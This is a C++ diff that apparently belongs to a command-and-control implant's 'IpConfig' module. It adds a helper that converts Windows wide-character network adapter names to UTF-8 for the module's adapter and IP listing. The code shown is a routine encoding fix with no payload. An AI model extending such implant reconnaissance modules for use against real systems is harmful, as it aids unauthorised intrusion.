@@ -69,6 +69,22 @@ int IpConfig::process(C2Message& c2Message, C2Message& c2RetMessage)
     return 0;
 }
 
+
+#ifdef _WIN32
+std::string WideToUTF8(const PWCHAR wideStr) {
+    if (!wideStr) return "";
+
+    int len = WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, nullptr, 0, nullptr, nullptr);
+    if (len == 0) return "";
+
+    std::string result(len - 1, 0); // exclude null terminator
+    WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, &result[0], len, nullptr, nullptr);
+
+    return result;
+}
+#endif
+
+
 std::string IpConfig::runIpconfig()
 {
 #ifdef _WIN32
@@ -81,7 +97,7 @@ std::string IpConfig::runIpconfig()
     {
         for(auto p = addr; p; p = p->Next)
         {
-            result += p->FriendlyName; result += "\n";
+            result += WideToUTF8(p->FriendlyName) + "\n";
             for(PIP_ADAPTER_UNICAST_ADDRESS unicast = p->FirstUnicastAddress; unicast; unicast = unicast->Next)
             {
                 char ip[INET6_ADDRSTRLEN];
